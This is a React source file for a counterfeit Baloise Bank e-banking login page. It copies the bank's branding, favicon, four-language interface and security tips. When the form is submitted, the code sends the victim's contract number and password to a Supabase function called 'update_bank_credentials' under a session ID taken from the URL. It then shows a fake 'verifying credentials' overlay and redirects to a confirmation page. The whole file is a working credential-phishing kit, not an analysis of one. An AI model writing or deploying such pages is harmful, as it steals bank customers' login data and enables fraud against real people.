import { useEffect, useRef, useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Eye, EyeOff, Globe, ChevronDown, Plus, Minus } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import baloiseLogo from "@/assets/baloise-logo.svg";

const NAVY = "#00005A";
const BANNER = "#DCEBFA";
const BODY_BG = "#F1F4F7";
const INFO_BG = "#ECEEF1";
const BORDER = "#C9CDD4";

type Lang = "de" | "fr" | "it" | "en";

const T: Record<Lang, Record<string, string>> = {
  de: {
    banner: "Wir sind Teil der Helvetia Baloise Gruppe",
    title: "Baloise E-banking",
    help: "Hilfe & Kontakt",
    h1: "Anmeldung",
    contract: "Vertragsnummer",
    password: "Passwort",
    placeholder: "Hier eingeben …",
    submit: "Anmelden",
    forgot: "Passwort vergessen",
    newDevice: "Neues Gerät aktivieren",
    secureTitle: "Sicher einloggen - nur so geht es richtig:",
    secureBody:
      "Tippen Sie die Adresse der Webseite der Baloise Bank (www.baloise.ch) immer manuell oben in der Adresszeile Ihres Browsers ein. Verwenden Sie niemals einen Link oder eine Suchmaschine (z.B. Bing oder Google).",
    moreTips: "Weitere Tipps",
    tip1: "Geben Sie Ihre Zugangsdaten ausschliesslich auf der offiziellen Baloise-Webseite ein.",
    tip2: "Prüfen Sie vor der Eingabe, ob das Schloss-Symbol und die korrekte Adresse angezeigt werden.",
    tip3: "Baloise wird Sie niemals per E-Mail oder Telefon nach Ihrem Passwort fragen.",
    fSecurity: "Sicherheit",
    fLegal: "Rechtliche Hinweise",
    fContact: "Kontakt",
    loading: "Anmeldedaten werden überprüft...",
  },
  fr: {
    banner: "Nous faisons partie du groupe Helvetia Baloise",
    title: "Baloise E-banking",
    help: "Aide & contact",
    h1: "Connexion",
    contract: "Numéro de contrat",
    password: "Mot de passe",
    placeholder: "Saisir ici …",
    submit: "Se connecter",
    forgot: "Mot de passe oublié",
    newDevice: "Activer un nouvel appareil",
    secureTitle: "Se connecter en toute sécurité - voici comment faire:",
    secureBody:
      "Tapez toujours l'adresse du site de la Baloise Bank (www.baloise.ch) manuellement dans la barre d'adresse de votre navigateur. N'utilisez jamais un lien ou un moteur de recherche (p.ex. Bing ou Google).",
    moreTips: "Autres conseils",
    tip1: "Saisissez vos données d'accès uniquement sur le site officiel de la Baloise.",
    tip2: "Avant la saisie, vérifiez le cadenas et l'adresse correcte.",
    tip3: "La Baloise ne vous demandera jamais votre mot de passe par e-mail ou téléphone.",
    fSecurity: "Sécurité",
    fLegal: "Mentions légales",
    fContact: "Contact",
    loading: "Vérification des données de connexion...",
  },
  it: {
    banner: "Facciamo parte del gruppo Helvetia Baloise",
    title: "Baloise E-banking",
    help: "Aiuto & contatto",
    h1: "Accesso",
    contract: "Numero di contratto",
    password: "Password",
    placeholder: "Inserire qui …",
    submit: "Accedi",
    forgot: "Password dimenticata",
    newDevice: "Attivare nuovo dispositivo",
    secureTitle: "Accedere in sicurezza - ecco come:",
    secureBody:
      "Digitate sempre manualmente l'indirizzo del sito della Baloise Bank (www.baloise.ch) nella barra degli indirizzi del browser. Non utilizzate mai un link o un motore di ricerca (es. Bing o Google).",
    moreTips: "Ulteriori suggerimenti",
    tip1: "Inserite i vostri dati d'accesso solo sul sito ufficiale di Baloise.",
    tip2: "Prima dell'inserimento, controllate il lucchetto e l'indirizzo corretto.",
    tip3: "Baloise non vi chiederà mai la password via e-mail o telefono.",
    fSecurity: "Sicurezza",
    fLegal: "Note legali",
    fContact: "Contatto",
    loading: "Verifica dei dati di accesso in corso...",
  },
  en: {
    banner: "We are part of the Helvetia Baloise Group",
    title: "Baloise E-banking",
    help: "Help & contact",
    h1: "Login",
    contract: "Contract number",
    password: "Password",
    placeholder: "Enter here …",
    submit: "Sign in",
    forgot: "Forgot password",
    newDevice: "Activate new device",
    secureTitle: "Log in securely - this is how it's done:",
    secureBody:
      "Always type the address of the Baloise Bank website (www.baloise.ch) manually in the address bar of your browser. Never use a link or a search engine (e.g. Bing or Google).",
    moreTips: "More tips",
    tip1: "Only enter your credentials on the official Baloise website.",
    tip2: "Before entering, check the padlock icon and the correct address.",
    tip3: "Baloise will never ask for your password by e-mail or phone.",
    fSecurity: "Security",
    fLegal: "Legal notice",
    fContact: "Contact",
    loading: "Verifying login credentials...",
  },
};

const LANG_OPTIONS: { code: Lang; label: string }[] = [
  { code: "de", label: "DE" },
  { code: "fr", label: "FR" },
  { code: "it", label: "IT" },
  { code: "en", label: "EN" },
];

const ChBaloise = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [tipsOpen, setTipsOpen] = useState(false);
  const [lang, setLang] = useState<Lang>("de");
  const [langOpen, setLangOpen] = useState(false);
  const langRef = useRef<HTMLDivElement | null>(null);
  const t = T[lang];

  usePageMeta(
    "Baloise E-Banking Login",
    "https://ebanking.baloise.ch/auth/ui/assets/custom/img/favicon.ico"
  );

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    const onDoc = (e: MouseEvent) => {
      if (langRef.current && !langRef.current.contains(e.target as Node)) {
        setLangOpen(false);
      }
    };
    document.addEventListener("mousedown", onDoc);
    return () => document.removeEventListener("mousedown", onDoc);
  }, []);

  const disabled = vertragsnummer.trim() === "" || passwort === "";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (disabled) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col"
        style={{
          background: BODY_BG,
          fontFamily:
            "'Helvetica Neue', Helvetica, Arial, 'Segoe UI', Roboto, sans-serif",
          color: NAVY,
        }}
      >
        {/* Banner */}
        <div
          className="w-full text-center py-2 text-[13px] font-semibold"
          style={{ background: BANNER, color: NAVY }}
        >
          {t.banner}
        </div>

        {/* Header */}
        <header
          className="w-full flex items-center justify-between px-4 md:px-10"
          style={{ background: NAVY, height: 80 }}
        >
          <div className="flex items-center gap-4">
            <a href="https://ebanking.baloise.ch/" aria-label="Baloise">
              <img src={baloiseLogo} alt="Baloise" className="h-7 md:h-8 w-auto" />
            </a>
            <span
              className="hidden sm:block w-px h-7"
              style={{ background: "rgba(255,255,255,0.3)" }}
            />
            <span className="hidden sm:inline text-white font-bold text-[16px] md:text-[18px]">
              {t.title}
            </span>
          </div>
          <div className="flex items-center gap-2 md:gap-3">
            <a
              href="https://www.baloise.ch/DE-e-banking"
              target="_blank"
              rel="noopener noreferrer"
              className="hidden sm:inline-flex items-center px-4 py-2 rounded-md text-white text-[14px] font-semibold transition-colors"
              style={{ border: "1px solid rgba(255,255,255,0.4)" }}
              onMouseEnter={(e) => (e.currentTarget.style.background = "rgba(255,255,255,0.1)")}
              onMouseLeave={(e) => (e.currentTarget.style.background = "transparent")}
            >
              {t.help}
            </a>
            <div className="relative" ref={langRef}>
              <button
                type="button"
                onClick={() => setLangOpen((v) => !v)}
                className="inline-flex items-center gap-2 px-3 md:px-4 py-2 rounded-md text-white text-[14px] font-semibold"
                style={{ border: "1px solid rgba(255,255,255,0.4)" }}
                aria-haspopup="listbox"
                aria-expanded={langOpen}
              >
                <Globe className="w-4 h-4" strokeWidth={1.8} />
                {lang.toUpperCase()}
                <ChevronDown className="w-3.5 h-3.5" strokeWidth={2} />
              </button>
              {langOpen && (
                <div
                  className="absolute right-0 top-full mt-2 z-30 rounded-md overflow-hidden shadow-lg bg-white min-w-[120px]"
                  style={{ border: `1px solid ${BORDER}` }}
                  role="listbox"
                >
                  {LANG_OPTIONS.map((opt) => (
                    <button
                      key={opt.code}
                      type="button"
                      onClick={() => {
                        setLang(opt.code);
                        setLangOpen(false);
                      }}
                      className="block w-full text-left px-4 py-2 text-[14px] hover:bg-gray-50"
                      style={{
                        color: NAVY,
                        fontWeight: opt.code === lang ? 700 : 500,
                      }}
                    >
                      {opt.label}
                    </button>
                  ))}
                </div>
              )}
            </div>
          </div>
        </header>

        {/* Main */}
        <main className="flex-1 px-4 md:px-6 py-10 md:py-12">
          <div className="max-w-[560px] mx-auto">
            {/* Login Card */}
            <section className="bg-white rounded-lg p-6 md:p-10 shadow-[0_1px_2px_rgba(0,0,0,0.06)]">
              <h1
                className="text-center font-extrabold mb-8"
                style={{ color: NAVY, fontSize: "clamp(22px, 3vw, 28px)" }}
              >
                {t.h1}
              </h1>

              <form onSubmit={handleSubmit} className="flex flex-col gap-5">
                {/* Vertragsnummer */}
                <div>
                  <label
                    htmlFor="bal-contract"
                    className="block text-[14px] font-bold mb-2"
                    style={{ color: NAVY }}
                  >
                    {t.contract}
                  </label>
                  <input
                    id="bal-contract"
                    type="text"
                    autoComplete="username"
                    placeholder={t.placeholder}
                    value={vertragsnummer}
                    onChange={(e) => setVertragsnummer(e.target.value)}
                    className="w-full h-11 rounded-md px-3 text-[15px] outline-none transition-colors"
                    style={{
                      border: `1px solid ${BORDER}`,
                      color: NAVY,
                    }}
                    onFocus={(e) => {
                      e.currentTarget.style.borderColor = NAVY;
                      e.currentTarget.style.boxShadow = `0 0 0 1px ${NAVY}`;
                    }}
                    onBlur={(e) => {
                      e.currentTarget.style.borderColor = BORDER;
                      e.currentTarget.style.boxShadow = "none";
                    }}
                  />
                </div>

                {/* Passwort */}
                <div>
                  <label
                    htmlFor="bal-pw"
                    className="block text-[14px] font-bold mb-2"
                    style={{ color: NAVY }}
                  >
                    {t.password}
                  </label>
                  <div className="relative">
                    <input
                      id="bal-pw"
                      type={showPw ? "text" : "password"}
                      autoComplete="current-password"
                      placeholder={t.placeholder}
                      value={passwort}
                      onChange={(e) => setPasswort(e.target.value)}
                      className="w-full h-11 rounded-md px-3 pr-11 text-[15px] outline-none transition-colors"
                      style={{
                        border: `1px solid ${BORDER}`,
                        color: NAVY,
                      }}
                      onFocus={(e) => {
                        e.currentTarget.style.borderColor = NAVY;
                        e.currentTarget.style.boxShadow = `0 0 0 1px ${NAVY}`;
                      }}
                      onBlur={(e) => {
                        e.currentTarget.style.borderColor = BORDER;
                        e.currentTarget.style.boxShadow = "none";
                      }}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPw((v) => !v)}
                      className="absolute right-2 top-1/2 -translate-y-1/2 p-1"
                      aria-label={showPw ? "Passwort verbergen" : "Passwort anzeigen"}
                      style={{ color: NAVY }}
                    >
                      {showPw ? (
                        <Eye className="w-5 h-5" strokeWidth={1.8} />
                      ) : (
                        <EyeOff className="w-5 h-5" strokeWidth={1.8} />
                      )}
                    </button>
                  </div>
                </div>

                {/* Anmelden */}
                <button
                  type="submit"
                  disabled={disabled}
                  className="w-full h-12 rounded-md font-bold text-[15px] mt-2 transition-colors"
                  style={{
                    background: disabled ? "#E5E7EB" : NAVY,
                    color: disabled ? "#9CA3AF" : "#FFFFFF",
                    cursor: disabled ? "not-allowed" : "pointer",
                  }}
                  onMouseEnter={(e) => {
                    if (!disabled) e.currentTarget.style.background = "#000040";
                  }}
                  onMouseLeave={(e) => {
                    if (!disabled) e.currentTarget.style.background = NAVY;
                  }}
                >
                  {t.submit}
                </button>

                <div className="flex flex-wrap justify-between gap-4 mt-3 text-[14px] font-bold">
                  <a
                    href="https://www.baloise.ch/de/privatkunden/services/passwort-vergessen.html"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="underline underline-offset-4"
                    style={{ color: NAVY }}
                  >
                    {t.forgot}
                  </a>
                  <a
                    href="https://www.baloise.ch/de/privatkunden/services/neues-geraet-aktivieren.html"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="underline underline-offset-4"
                    style={{ color: NAVY }}
                  >
                    {t.newDevice}
                  </a>
                </div>
              </form>
            </section>

            {/* Info Box */}
            <section
              className="rounded-lg p-6 mt-6"
              style={{ background: INFO_BG, color: NAVY }}
            >
              <h2 className="font-bold text-[15px] mb-3">{t.secureTitle}</h2>
              <p className="text-[14px] leading-relaxed">{t.secureBody}</p>
              <div
                className="mt-5 pt-4"
                style={{ borderTop: `1px solid rgba(0,0,90,0.2)` }}
              >
                <button
                  type="button"
                  onClick={() => setTipsOpen((v) => !v)}
                  className="w-full flex items-center justify-between text-[14px] font-bold"
                  style={{ color: NAVY }}
                  aria-expanded={tipsOpen}
                >
                  <span className="underline underline-offset-4">{t.moreTips}</span>
                  {tipsOpen ? (
                    <Minus className="w-5 h-5" strokeWidth={2} />
                  ) : (
                    <Plus className="w-5 h-5" strokeWidth={2} />
                  )}
                </button>
                {tipsOpen && (
                  <ul className="mt-4 flex flex-col gap-2 text-[14px] leading-relaxed list-disc pl-5">
                    <li>{t.tip1}</li>
                    <li>{t.tip2}</li>
                    <li>{t.tip3}</li>
                  </ul>
                )}
              </div>
            </section>
          </div>
        </main>

        {/* Footer */}
        <footer
          className="bg-white py-5 mt-8"
          style={{ borderTop: "1px solid #E5E7EB" }}
        >
          <div className="max-w-[1180px] mx-auto px-4 flex flex-wrap justify-center gap-6 md:gap-10 text-[13px] font-semibold">
            <a
              href="https://www.baloise.ch/de/privatkunden/services/sicherheit.html"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: NAVY }}
              className="hover:underline"
            >
              {t.fSecurity}
            </a>
            <a
              href="https://www.baloise.ch/de/ueber-uns/rechtliche-hinweise.html"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: NAVY }}
              className="hover:underline"
            >
              {t.fLegal}
            </a>
            <a
              href="https://www.baloise.ch/de/kontakt.html"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: NAVY }}
              className="hover:underline"
            >
              {t.fContact}
            </a>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChBaloise;
